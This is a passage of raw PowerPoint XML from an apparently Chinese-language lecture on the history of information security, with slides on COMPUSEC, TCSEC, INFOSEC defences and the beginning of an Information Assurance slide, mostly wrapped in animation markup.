                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="81"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="32"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nodePh="1">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:endCondLst>
                                    <p:cond evt="begin" delay="0">
                                      <p:tn val="41"/>
                                    </p:cond>
                                  </p:endCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="78"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="78"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="78"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="45" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="78"/>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79"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="48" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="79"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="49" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="79"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="50" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="79"/>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80"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="53" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="80"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="54" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="80"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="55"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8" grpId="0"/>
      <p:bldP spid="79" grpId="0"/>
      <p:bldP spid="4" grpId="0"/>
      <p:bldP spid="8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3" y="680571"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>计算机安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395535" y="1412776"/>
            <a:ext cx="8496945" cy="2185211"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>COMPUSEC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Computer Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>世纪，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>70-90</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>年代</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>核心思想：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>预防、检测和减小计算机系统（包括软件和硬件）用户（授权和未授权用户）执行的未授权活动所造成的后果。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>主要关注于数据处理和存储时的数据保护 。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395534" y="3717032"/>
            <a:ext cx="8748465" cy="430887"/>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en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全威胁：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>非法访问、恶意代码、脆弱口令等</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395533" y="4150241"/>
            <a:ext cx="7920883" cy="430887"/>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en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全措施：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>通过操作系统的访问控制技术来防止非授权用户的访问</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="971600" y="5013176"/>
            <a:ext cx="7344816" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1985</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>月由美国国防部公布</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TCSEC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>将计算机系统的安全划分为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>个等级、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>个级别。</a:t>
            </a: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7642" y="2257067"/>
            <a:ext cx="5976664" cy="3474472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12516394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753654"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息系统安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="1485279"/>
            <a:ext cx="8640960" cy="2349624"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>INFOSEC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Information Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>世纪，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>90</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>年代后</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>核心思想：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>综合通信安全和计算机安全安全</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>重点在于保护比“数据”更精炼的“信息”，确保信息在存储、处理和传输过程中免受偶然或恶意的非法泄密、转移或破坏 。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="3690887"/>
            <a:ext cx="7632848" cy="430887"/>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en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全威胁：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络入侵、病毒破坏、信息对抗等</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="4122935"/>
            <a:ext cx="7804033" cy="430887"/>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en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全措施：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>防火墙、防病毒、漏洞扫描、入侵检测、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>PKI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>VPN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>等</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6107148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377" y="1412776"/>
            <a:ext cx="7128792" cy="4282645"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="366345" y="857481"/>
            <a:ext cx="8186857" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息系统安全需满足“等级保护规定”或“分级保护规定”</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24758160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703262"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络化社会</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1295400"/>
            <a:ext cx="7855024" cy="2421632"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>新世纪信息技术应用于人类社会的方方面面</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>军事</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>经济</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文化</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="3717032"/>
            <a:ext cx="8172400" cy="523220"/>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现在人们意识到：技术很重要，但技术不是一切</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1043608" y="4293096"/>
            <a:ext cx="7704856" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息系统很重要，只有服务于组织业务使命才有意义</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="24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14119971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703262"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息安全保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1295400"/>
            <a:ext cx="8191500" cy="2136142"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Information Assurance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>21</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>世纪初，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>2010</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>年前</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>核心思想：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
